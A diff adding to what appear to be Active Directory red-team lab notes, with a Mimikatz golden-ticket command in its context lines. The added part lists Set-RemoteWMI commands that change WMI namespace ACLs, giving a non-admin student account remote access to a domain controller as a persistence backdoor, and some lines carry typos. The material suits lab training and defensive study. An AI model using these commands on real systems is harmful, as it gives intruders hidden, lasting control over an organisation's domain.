@@ -523,3 +523,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - ACE for builit-in administrators for WMI namespaces
   - `A;CI;CCDCLCSWRPWRPCWD;;;SID`
   - We need to replace the SID with the SID of account which we would like to use. The account will have full access over the particular namespaces.
+
+**ACLs can be modified to allow non admin users access to securable objects**
+- On local machine for student1:
+  - `Set-RemoteWMI -Username student1 -Verbose`
+- On remote machine for student1 without explicit credentials
+  - `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Verbose`
+- On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
+  - `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Credential Administrator -namespace `root\cimv2` -Verbose`
+- On remote machine remove permissions
+  - `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose`
